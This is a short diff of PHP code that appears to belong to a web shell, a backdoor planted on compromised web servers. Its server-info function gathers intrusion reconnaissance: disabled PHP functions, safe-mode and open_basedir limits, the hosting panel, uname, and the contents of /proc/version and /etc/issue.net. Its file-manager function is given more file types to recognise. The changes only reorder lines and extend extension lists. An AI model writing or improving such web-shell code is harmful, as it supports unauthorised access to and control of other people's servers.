@@ -74,18 +74,18 @@ function serverSecInfo(){
 	$sInfo[] = showInf('Server software', (AvFunc(array('getenv')) ? @getenv('SERVER_SOFTWARE') : 'Unknown'));
 	$sInfo[] = showInf('Server ip', (AvFunc(array('gethostbyname')) ? @gethostbyname($_SERVER['HTTP_HOST']) : 'Unknown'));
 	$sInfo[] = showInf('Server panel', serverPanel());
-	$sInfo[] = showInf('Loaded Apache modules', (AvFunc(array('apache_get_modules')) ? implode(', ', @apache_get_modules()) : '-'));
-	$sInfo[] = showInf('cURL support', (AvFunc(array('curl_version')) ? 'Yes ('.curl_version()['version'].')' : 'No'));
-	$sInfo[] = showInf('Databases', (isset($temp) ? implode(', ',$temp) : 'Unknown'));
-	$sInfo[] = showInf('PHP Version', @phpversion());
-	$sInfo[] = showInf('Disabled PHP Functions', (count(disFunc())>0 ? implode(', ', disFunc()) : 'none'));
-	$sInfo[] = showInf('Uname', @php_uname());
 	if(AvFunc(array('ini_get'))){
 		$sInfo[] = showInf('Open base dir', @ini_get('open_basedir'));
 		$sInfo[] = showInf('Safe mode', (@ini_get('safe_mode') ? 'ON' : 'OFF'));
 		$sInfo[] = showInf('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
 		$sInfo[] = showInf('Safe mode include dir', @ini_get('safe_mode_include_dir'));		
 	}
+	$sInfo[] = showInf('Loaded Apache modules', (AvFunc(array('apache_get_modules')) ? implode(', ', @apache_get_modules()) : '-'));
+	$sInfo[] = showInf('cURL support', (AvFunc(array('curl_version')) ? 'Yes ('.curl_version()['version'].')' : 'No'));
+	$sInfo[] = showInf('Databases', (isset($temp) ? implode(', ',$temp) : 'Unknown'));
+	$sInfo[] = showInf('PHP Version', @phpversion());
+	$sInfo[] = showInf('Disabled PHP Functions', (count(disFunc())>0 ? implode(', ', disFunc()) : 'none'));
+	$sInfo[] = showInf('Uname', @php_uname());
 	if($GLOBALS['os'] == 'nix'){
 		$sInfo[] = showInf('OS Version', (AvFunc(array('file_get_contents')) ? @file_get_contents('/proc/version') : 'Unknown'));
 		$sInfo[] = showInf('Distro name', (AvFunc(array('file_get_contents')) ? @file_get_contents('/etc/issue.net') : 'Unknown'));
@@ -380,19 +380,19 @@ function filemanager($fm){
 				$ext  = pathinfo($dir['full_path'], PATHINFO_EXTENSION);
 				$zadd = '';
 				if(!empty($ext)){
-					if($ext == 'css'){
+					if(in_array($ext, array('css','less'))){
 						$ftype = fType('css','1.5em');
 					} else if(in_array($ext, array('txt','ini'))){
 						$ftype = fType('txt');
 					} else if(in_array($ext, array('js','json'))){
 						$ftype = fType('js','1.8em');
-					} else if(in_array($ext, array('php','phtml','php5','php7'))){
+					} else if(in_array($ext, array('php','phtml','php5','php7','inc','module'))){
 						$ftype = fType('php');
 					} else if(in_array($ext, array('html','shtml'))){
 						$ftype = fType('html');
 					} else if(in_array($ext, array('zip','rar','tar','tar.bz'))){
 						$ftype = fType('zip');
-					} else if(in_array($ext, array('jpg','png','bmp','gif','psd','jpeg','webp','ai','xcf','cdr','tif','tiff','eps'))){
+					} else if(in_array($ext, array('jpg','png','bmp','gif','psd','jpeg','webp','ico','ai','xcf','cdr','tif','tiff','eps'))){
 						$ftype = fType('img');
 					} else {
 						$ftype = fType('other');
